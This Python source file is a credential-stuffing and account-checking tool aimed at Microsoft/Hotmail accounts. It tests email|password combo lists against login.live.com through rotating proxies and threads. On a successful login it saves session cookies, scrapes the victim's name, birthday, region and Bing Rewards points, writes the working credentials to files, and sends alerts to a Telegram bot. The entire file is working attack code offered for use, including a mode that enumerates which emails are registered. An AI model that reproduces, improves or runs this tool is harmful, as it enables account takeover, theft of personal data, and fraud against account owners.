import requests
import re
from concurrent.futures import ThreadPoolExecutor
import os
import time
import json
from pystyle import Colorate, Colors, Center, Write
from colorama import Fore, Style, init

init(autoreset=True)

# =========================
# SET YOUR TELEGRAM DETAILS HERE
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
# =========================

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_ascii():
    smtp_checker = r"""

██╗  ██╗ ██████╗ ████████╗███╗   ███╗ █████╗ ██╗██╗          ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██║  ██║██╔═══██╗╚══██╔══╝████╗ ████║██╔══██╗██║██║         ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
███████║██║   ██║   ██║   ██╔████╔██║███████║██║██║         ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██╔══██║██║   ██║   ██║   ██║╚██╔╝██║██╔══██║██║██║         ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║  ██║╚██████╔╝   ██║   ██║ ╚═╝ ██║██║  ██║██║███████╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                
   """
    by = r"""
                                 
                        ██████╗ ██╗   ██╗
                        ██╔══██╗╚██╗ ██╔╝
                        ██████╔╝ ╚████╔╝ 
                        ██╔══██╗  ╚██╔╝  
                        ██████╔╝   ██║   
                        ╚═════╝    ╚═╝   
                 
    """
    bob_marley = r"""

██████╗  ██████╗ ██████╗     ███╗   ███╗ █████╗ ██████╗ ██╗     ███████╗██╗   ██╗
██╔══██╗██╔═══██╗██╔══██╗    ████╗ ████║██╔══██╗██╔══██╗██║     ██╔════╝╚██╗ ██╔╝
██████╔╝██║   ██║██████╔╝    ██╔████╔██║███████║██████╔╝██║     █████╗   ╚████╔╝ 
██╔══██╗██║   ██║██╔══██╗    ██║╚██╔╝██║██╔══██║██╔══██╗██║     ██╔══╝    ╚██╔╝  
██████╔╝╚██████╔╝██████╔╝    ██║ ╚═╝ ██║██║  ██║██║  ██║███████╗███████╗   ██║   
╚═════╝  ╚═════╝ ╚═════╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   
                                                                                 
   """
    print()
    print(Center.XCenter(Colorate.Horizontal(Colors.red_to_green, smtp_checker, 1)))
    print(Center.XCenter(Colorate.Horizontal(Colors.yellow_to_green, by, 1)))
    print(Center.XCenter(Colorate.Horizontal(Colors.red_to_green, bob_marley, 1)))
    print()

def print_status(message, status_type="info"):
    if status_type == "info":
        print(f"{Fore.LIGHTBLUE_EX}[ INFO ] {message}{Style.RESET_ALL}")
    elif status_type == "success":
        print(f"{Fore.GREEN}[ SUCCESS ] {message}{Style.RESET_ALL}")
    elif status_type == "error":
        print(f"{Fore.RED}[ ERROR ] {message}{Style.RESET_ALL}")
    elif status_type == "detail":
        print(f"{Fore.CYAN}[ DETAIL ] {message}{Style.RESET_ALL}")

def save_cookies(session, email):
    os.makedirs("cookies", exist_ok=True)
    cookies_file = f"cookies/{email}.json"
    cookies_dict = [
        {
            "domain": cookie.domain,
            "hostOnly": cookie._rest.get("hostOnly", False),
            "httpOnly": cookie._rest.get("httpOnly", False),
            "name": cookie.name,
            "path": cookie.path,
            "sameSite": cookie._rest.get("sameSite", "no_restriction"),
            "secure": cookie.secure,
            "session": cookie._rest.get("session", False),
            "storeId": None,
            "value": cookie.value,
            "expirationDate": cookie.expires if cookie.expires else None
        } for cookie in session.cookies
    ]
    with open(cookies_file, 'w') as file:
        json.dump(cookies_dict, file, indent=4)
    print_status(f"Cookies saved for {email} in JSON format", "info")

def send_telegram_message(bot_token, chat_id, message):
    if not bot_token or not chat_id:
        return
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(url, data={"chat_id": chat_id, "text": message})
    except Exception as e:
        print_status(f"Failed to send Telegram message: {e}", "error")

def check_email(email, use_proxy=False, proxy=None, index=None, total=None, progress=None):
    session = requests.Session()
    if use_proxy and proxy:
        session.proxies = {"http": proxy, "https": proxy}

    public_ip = session.get("https://api.ipify.org").text
    if index is not None and total is not None:
        percentage = (index / total) * 100
        print_status(f"Checking email {index}/{total} ({percentage:.2f}%) => {email} - IP Address: {public_ip}", "info")

    url = f"https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=156&ct=1722369140&rver=7.0.6738.0&wp=MBI_SSL&wreply=https://rewards.bing.com&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&login_hint={email}&username={email}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    response = session.get(url, headers=headers)

    if "Credentials" in response.text:
        print_status(f"{email} Status: Registered - IP Address: {public_ip}", "success")
        with open("registered_emails.txt", "a") as registered_file:
            registered_file.write(f"{email}\n")
        progress['success'] += 1
    else:
        print_status(f"{email} Status: Not Registered - IP Address: {public_ip}", "error")
        with open("not_registered_emails.txt", "a") as not_registered_file:
            not_registered_file.write(f"{email}\n")
        progress['error'] += 1

def check_account(email, password, use_proxy=False, proxy=None, index=None, total=None, progress=None, bot_token=None, chat_id=None, valid_logins=None):
    session = requests.Session()
    if use_proxy and proxy:
        session.proxies ={"http": proxy, "https": proxy}

    public_ip = session.get("https://api.ipify.org").text
    if index is not None and total is not None:
        percentage = (index / total) * 100
        print_status(f"Checking account {index}/{total} ({percentage:.2f}%) => {email} | {password} - IP Address: {public_ip}", "info")

    url = f"https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=156&ct=1722369140&rver=7.0.6738.0&wp=MBI_SSL&wreply=https://rewards.bing.com&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&login_hint={email}&username={email}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    response = session.get(url, headers=headers)

    if "Credentials" in response.text:
        match = re.search(r"urlPostMsa:'(https://login.live.com/ppsecure/post.srf\?username=[^']+)'", response.text)
        ppft_match = re.search(r'<input type="hidden" name="PPFT" id="i0327" value="([^"]+)"', response.text)

        if match and ppft_match:
            url_post_msa = match.group(1)
            ppft_value = ppft_match.group(1)

            post_data = {
                'ps': '2',
                'psRNGCDefaultType': '1',
                'psRNGCEntropy': '',
                'psRNGCSLK': '',
                'canary': '',
                'ctx': '',
                'hpgrequestid': '',
                'PPFT': ppft_value,
                'PPSX': 'P',
                'NewUser': '1',
                'FoundMSAs': '',
                'fspost': '0',
                'i21': '0',
                'CookieDisclosure': '0',
                'IsFidoSupported': '1',
                'isSignupPost': '0',
                'isRecoveryAttemptPost': '0',
                'i13': '0',
                'login': email,
                'loginfmt': email,
                'type': '11',
                'LoginOptions': '3',
                'lrt': '',
                'lrtPartition': '',
                'hisRegion': '',
                'hisScaleUnit': '',
                'passwd': password
            }

            post_headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
            }
            print_status(f"{email} Status: Email Registered - IP Address: {public_ip}", "success")

            post_response = session.post(url_post_msa, headers=post_headers, data=post_data)

            if "sSigninName" in post_response.text:
                cookies_get_url2 = "https://outlook.live.com/mail/0/inbox/"
                cookies_get_headers2 = {
                    'content-type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
                }
                session.get(cookies_get_url2, headers=cookies_get_headers2)
                
                reward_url = "https://rewards.bing.com/Signin?idru=%2F"
                reward_headers = {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
                }

                reward_response = session.get(reward_url, headers=reward_headers)
                client_info = re.search(r'<input type="hidden" name="client_info" id="client_info" value="([^"]+)"', reward_response.text)
                code = re.search(r'<input type="hidden" name="code" id="code" value="([^"]+)"', reward_response.text)
                state = re.search(r'<input type="hidden" name="state" id="state" value="([^"]+)"', reward_response.text)

                if client_info and code and state:
                    form_data = {
                        'client_info': client_info.group(1),
                        'code': code.group(1),
                        'state': state.group(1)
                    }

                    final_url = "https://rewards.bing.com/signin-oidc"
                    final_response = session.post(final_url, data=form_data, headers={
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
                    })

                    available_points_match = re.search(r'availablePoints":(\d+)', final_response.text)
                    available_points = int(available_points_match.group(1)) if available_points_match else "Not found"

                    profile_url = "https://account.microsoft.com/profile?lang=en-US&refd=account.live.com"
                    profile_response = session.get(profile_url, headers={
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
                    })

                    pprid_match = re.search(r'<input type="hidden" name="pprid" id="pprid" value="([^"]+)"', profile_response.text)
                    nap_match = re.search(r'<input type="hidden" name="NAP" id="NAP" value="([^"]+)"', profile_response.text)
                    anon_match = re.search(r'<input type="hidden" name="ANON" id="ANON" value="([^"]+)"', profile_response.text)
                    t_match = re.search(r'<input type="hidden" name="t" id="t" value="([^"]+)"', profile_response.text)

                    if pprid_match and nap_match and anon_match and t_match:
                        profile_post_data = {
                            'pprid': pprid_match.group(1),
                            'NAP': nap_match.group(1),
                            'ANON': anon_match.group(1),
                            't': t_match.group(1)
                        }

                        profile_post_url = "https://account.microsoft.com/auth/complete-silent-signin?ru=https%3A%2F%2Faccount.microsoft.com%2Fprofile%3Flang%3Den-US%26refd%3Daccount.live.com&wa=wsignin1.0"
                        final_profile_response = session.post(profile_post_url, data=profile_post_data, headers={
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
                        })

                        redirect_url_match = re.search(r'<meta http-equiv="refresh" content="\d+;([^"]+)"', final_profile_response.text)
                        if redirect_url_match:
                            redirect_url = redirect_url_match.group(1)
                            final_redirect_response = session.get(redirect_url, headers={
                                'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
                            })

                            form_action_match = re.search(r'<form name="fmHF" id="fmHF" action="([^"]+)" method="post"', final_redirect_response.text)
                            pprid_value = re.search(r'<input type="hidden" name="pprid" id="pprid" value="([^"]+)"', final_redirect_response.text)
                            nap_value = re.search(r'<input type="hidden" name="NAP" id="NAP" value="([^"]+)"', final_redirect_response.text)
                            anon_value = re.search(r'<input type="hidden" name="ANON" id="ANON" value="([^"]+)"', final_redirect_response.text)
                            t_value = re.search(r'<input type="hidden" name="t" id="t" value="([^"]+)"', final_redirect_response.text)

                            if form_action_match and pprid_value and nap_value and anon_value and t_value:
                                form_action_url = form_action_match.group(1)
                                pprid = pprid_value.group(1)
                                nap = nap_value.group(1)
                                anon = anon_value.group(1)
                                t = t_value.group(1)

                                final_post_data = {
                                    'pprid': pprid,
                                    'NAP': nap,
                                    'ANON': anon,
                                    't': t
                                }

                                final_form_response = session.post(form_action_url, data=final_post_data, headers={
                                    'Content-Type': 'application/x-www-form-urlencoded',
                                    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
                                })

                                request_verification_token_match = re.search(r'<input name="__RequestVerificationToken" type="hidden" value="([^"]+)"', final_form_response.text)
                                if request_verification_token_match:
                                    request_verification_token = request_verification_token_match.group(1)

                                    profile_api_url = "https://account.microsoft.com/profile/api/v1/personal-info"
                                    profile_api_headers = {
                                        'Accept': 'application/json, text/plain, */*',
                                        'Referer': 'https://account.microsoft.com/profile?lang=en-US&refd=account.live.com',
                                        'Sec-Fetch-Dest': 'empty',
                                        'Sec-Fetch-Mode': 'cors',
                                        'Sec-Fetch-Site': 'same-origin',
                                        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
                                        'X-Requested-With': 'XMLHttpRequest',
                                        '__RequestVerificationToken': request_verification_token
                                    }

                                    profile_api_response = session.get(profile_api_url, headers=profile_api_headers)
                                    save_cookies(session, email)

                                    profile_data = profile_api_response.json()
                                    full_name = profile_data.get("fullName", "Not found")
                                    birthday = profile_data.get("birthday", "Not found")
                                    region = profile_data.get("region", "Not found")
                                    print_status(f"{email} Status: Successfully Logged - IP Address: {public_ip}", "success")
                                    print(f"\n===============================\n")
                                    print_status(f"Email: {email}", "detail")
                                    print_status(f"Password: {password}", "detail")
                                    print_status(f"Available Points: {available_points}", "detail")
                                    print_status(f"Full Name: {full_name}", "detail")
                                    print_status(f"Birthday: {birthday}", "detail")
                                    print_status(f"Region: {region}", "detail")
                                    print(f"\n===============================\n")
                                    with open("live_microsoft.txt", "a") as live_file:
                                        live_file.write(f"===============================\n{email}|{password}\nAvailable Points: {available_points}\nFull Name: {full_name}\nBirthday: {birthday}\nRegion: {region}\n===============================\n")
                                    progress['success'] += 1
                                    if valid_logins is not None:
                                        valid_logins.append(f"{email}|{password}")
                                    if bot_token and chat_id:
                                        send_telegram_message(bot_token, chat_id, "Valid Logins Found ✅")
                                else:
                                    print_status(f"RequestVerificationToken not found in final_form_response. IP Address: {public_ip}", "error")
                                    progress['error'] += 1
                            else:
                                print_status(f"Failed to extract form action URL or input values from redirect response. IP Address: {public_ip}", "error")
                                progress['error'] += 1
                        else:
                            print_status(f"Redirect URL not found in final response. IP Address: {public_ip}", "error")
                            progress['error'] += 1
                    else:
                        print_status(f"Form data not found in profile response. IP Address: {public_ip}", "error")
                        progress['error'] += 1
                else:
                    print_status(f"Form data not found in rewards response. IP Address: {public_ip}", "error")
                    progress['error'] += 1
            else:
                error_match = re.search(r"sErrTxt:'([^']+)'", post_response.text) or re.search(r'sErrTxt:"([^"]+)"', post_response.text)
                error_message = error_match.group(1) if error_match else "Check Manual"
                cleaned_error_message = error_message.replace("\\'", "'").replace('\\"', '"')
                shortened_error_message = cleaned_error_message.split('.')[0] + '.'
                print_status(f"{email} status: {shortened_error_message} - IP Address: {public_ip}", "error")
                with open("dead.txt", "a") as dead_file:
                    dead_file.write(f"{email}|{password} - {shortened_error_message}\n")
                progress['error'] += 1

                if error_message == "Check Manual":
                    with open("check_manual_microsoft.txt", "a") as manual_file:
                        manual_file.write(f"{email}|{password}\n")
        else:
            print_status(f"urlPostMsa or PPFT not found in HTML response. - IP Address: {public_ip}", "error")
            with open("error.txt", "a") as dead_file:
                dead_file.write(f"{email}|{password} - urlPostMsa or PPFT not found in HTML response\n")
            progress['error'] += 1
    else:
        print_status(f"{email} Status: Email Not Registered - IP Address: {public_ip}", "error")
        with open("not_registered_microsoft.txt", "a") as manual_file:
            manual_file.write(f"{email}|{password}\n")
        progress['error'] += 1

def main():
    clear()
    print_ascii()

    print(Colorate.Horizontal(Colors.green_to_yellow, "What do you want to check for?"))
    print(Colorate.Horizontal(Colors.green_to_yellow, "1. Registered emails only (Valid Email)"))
    print(Colorate.Horizontal(Colors.green_to_yellow, "2. Check Login credentials (Valid Login)"))
    check_type_input = Write.Input("Select (1/2): ", Colors.green_to_yellow, interval=0.005).strip()
    if check_type_input == "1":
        check_type = "valid"
    elif check_type_input == "2":
        check_type = "login"
    else:
        print_status("Invalid choice, please enter 1 or 2.", "error")
        return

    print()
    print(Colorate.Horizontal(Colors.green_to_yellow, "Use proxy? (1=Yes 2=No)"))
    use_proxy_input = Write.Input("Select (1/2): ", Colors.green_to_yellow, interval=0.005).strip()
    use_proxy = use_proxy_input == "1"
    proxies = []
    if use_proxy:
        proxy_file = Write.Input("Input your proxy file (default: http://127.0.0.1:40001): ", Colors.green_to_yellow, interval=0.005).strip()
        if proxy_file and os.path.exists(proxy_file):
            with open(proxy_file, "r") as pf:
                proxies = [line.strip() for line in pf if line.strip()]
        else:
            proxies = ["http://127.0.0.1:40001"]

    try:
        thread_count = int(Write.Input("Enter the number of threads to use (default: 1): ", Colors.green_to_yellow, interval=0.005).strip() or "1")
    except ValueError:
        thread_count = 1

    login_file = Write.Input("Enter the file name (default: list.txt): ", Colors.green_to_yellow, interval=0.005).strip() or "list.txt"

    if not os.path.exists(login_file):
        print_status(f"Error: {login_file} file not found.", "error")
        return

    with open(login_file, "r") as file:
        lines = file.readlines()

    if check_type == 'valid':
        accounts = [line.strip().split('|')[0] for line in lines if '|' in line]
    else:
        accounts = [line.strip().split('|')[:2] for line in lines if '|' in line]

    total_accounts = len(accounts)
    print(f"\n")
    print_status(f"Total List: {total_accounts}", "info")
    start_time = time.time()
    progress = {'success': 0, 'error': 0}
    valid_logins = []

    def get_proxy(index):
        if proxies:
            return proxies[index % len(proxies)]
        else:
            return None

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for index, account in enumerate(accounts, start=1):
            proxy = get_proxy(index) if use_proxy else None
            if check_type == 'valid':
                executor.submit(check_email, account, use_proxy, proxy, index, total_accounts, progress)
            else:
                email, password = account
                executor.submit(check_account, email, password, use_proxy, proxy, index, total_accounts, progress, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, valid_logins)

    end_time = time.time()
    total_time = end_time - start_time
    print_status(f"Check completed in {total_time:.2f} seconds.", "info")
    print_status(f"Total Success: {progress['success']}", "success")
    print_status(f"Total Errors: {progress['error']}", "error")

    if check_type == "login" and TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, f"Valid Logins Found : {len(valid_logins)} ✅")

if __name__ == "__main__":
    main()
